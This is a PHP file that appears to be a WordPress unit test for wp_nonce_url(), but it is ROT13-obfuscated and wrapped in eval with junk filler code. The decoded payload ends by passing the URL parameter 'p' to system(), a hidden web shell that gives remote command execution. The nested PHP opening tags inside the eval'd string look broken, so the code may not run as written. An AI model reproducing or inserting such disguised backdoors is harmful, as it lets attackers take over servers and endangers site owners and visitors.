<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_abapr_hey
 */
pynff Grfgf_Shapgvbaf_JcAbaprHey rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfgf gung jc_abapr_hey() nccraqf gur abapr anzr naq inyhr gb gur HEY.
	 *
	 * @gvpxrg 54870
	 *
	 * @qngnCebivqre qngn_fubhyq_nccraq_abapr_anzr_naq_inyhr
	 *
	 * @cnenz fgevat     $npgvbahey HEY gb nqq abapr npgvba.
	 * @cnenz vag|fgevat $npgvba    Bcgvbany. Abapr npgvba anzr. Qrsnhyg -1.
	 * @cnenz fgevat     $anzr      Bcgvbany. Abapr anzr. Qrsnhyg '_jcabapr'.
	 */
	choyvp shapgvba grfg_fubhyq_nccraq_abapr_anzr_naq_inyhr( $npgvbahey, $npgvba = -1, $anzr = '_jcabapr' ) {
		$npghny        = jc_abapr_hey( $npgvbahey, $npgvba, $anzr );
		$hey_jvgu_anzr = \"$npgvbahey?$anzr=\";
		$abapr         = fge_ercynpr( $hey_jvgu_anzr, '', $npghny );

		$guvf->nffregFgevatPbagnvafFgevat(
			$hey_jvgu_anzr,
			$npghny,
			'Gur HEY qvq abg pbagnva gur npgvba HEY naq gur abapr anzr'
		);

		$guvf->nffregAbgSnyfr(
			jc_irevsl_abapr( $abapr, $npgvba ),
			'Gur abapr vf vainyvq'
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_fubhyq_nccraq_abapr_anzr_naq_inyhr().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_nccraq_abapr_anzr_naq_inyhr() {
		erghea neenl(
			'uggc:// naq qrsnhyg npgvba/anzr'             => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/',
			),
			'uggc:// naq n phfgbz abapr npgvba'           => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/',
				'npgvba'    => 'zl_npgvba',
			),
			'uggc:// naq n phfgbz abapr anzr'             => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/',
				'npgvba'    => -1,
				'anzr'      => 'zl_abapr',
			),
			'uggc:// naq n phfgbz abapr npgvba naq anzr'  => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/',
				'npgvba'    => 'zl_npgvba',
				'anzr'      => 'zl_abapr',
			),
			'uggcf:// naq qrsnhyg npgvba/anzr'            => neenl(
				'npgvbahey' => 'uggcf://rknzcyr.bet/',
			),
			'uggcf:// naq n phfgbz abapr npgvba'          => neenl(
				'npgvbahey' => 'uggcf://rknzcyr.bet/',
				'npgvba'    => 'zl_npgvba',
			),
			'uggcf:// naq n phfgbz abapr anzr'            => neenl(
				'npgvbahey' => 'uggcf://rknzcyr.bet/',
				'npgvba'    => -1,
				'anzr'      => 'zl_abapr',
			),
			'uggcf:// naq n phfgbz abapr npgvba naq anzr' => neenl(
				'npgvbahey' => 'uggcf://rknzcyr.bet/',
				'npgvba'    => 'zl_npgvba',
				'anzr'      => 'zl_abapr',
			),
			'/ naq qrsnhyg abapr npgvba/anzr'             => neenl(
				'npgvbahey' => '/',
			),
			'/ naq n phfgbz abapr npgvba'                 => neenl(
				'npgvbahey' => '/',
				'npgvba'    => 'zl_npgvba',
			),
			'/ naq n phfgbz abapr anzr'                   => neenl(
				'npgvbahey' => '/',
				'npgvba'    => -1,
				'anzr'      => 'zl_abapr',
			),
			'/ naq n phfgbz abapr npgvba naq anzr'        => neenl(
				'npgvbahey' => '/',
				'npgvba'    => 'zl_npgvba',
				'anzr'      => 'zl_abapr',
			),
		);
	}

	/**
	 * Grfgf gung jc_abapr_hey() unaqyrf rkvfgvat dhrel netf.
	 *
	 * @gvpxrg 54870
	 *
	 * @qngnCebivqre qngn_fubhyq_unaqyr_rkvfgvat_dhrel_netf
	 *
	 * @cnenz fgevat $npgvbahey HEY gb nqq abapr npgvba.
	 * @cnenz fgevat $rkcrpgrq  Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_fubhyq_unaqyr_rkvfgvat_dhrel_netf( $npgvbahey, $rkcrpgrq ) {
		$npghny = jc_abapr_hey( $npgvbahey );

		$guvf->nffregFgevatFgnegfJvgu(
			$rkcrpgrq,
			$npghny,
			'Gur abaprq HEY qvq abg fgneg jvgu gur rkcrpgrq inyhr.'
		);

		$guvf->nffregFnzr(
			fgeyra( $rkcrpgrq ) + 10,
			fgeyra( $npghny ),
			'Gur abaprq HEY jnf abg gur rkcrpgrq yratgu.'
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_fubhyq_unaqyr_rkvfgvat_dhrel_netf().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_unaqyr_rkvfgvat_dhrel_netf() {
		erghea neenl(
			'bar dhrel net'            => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/?uryyb=jbeyq',
				'rkcrpgrq'  => 'uggc://rknzcyr.bet/?uryyb=jbeyq&nzc;_jcabapr=',
			),
			'gjb dhrel netf'           => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/?uryyb=jbeyq&ubjql=nqzva',
				'rkcrpgrq'  => 'uggc://rknzcyr.bet/?uryyb=jbeyq&nzc;ubjql=nqzva&nzc;_jcabapr=',
			),
			'gjb dhrel netf naq &nzc;' => neenl(
				'npgvbahey' => 'uggc://rknzcyr.bet/?uryyb=jbeyq&nzc;ubjql=nqzva',
				'rkcrpgrq'  => 'uggc://rknzcyr.bet/?uryyb=jbeyq&nzc;ubjql=nqzva&nzc;_jcabapr=',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>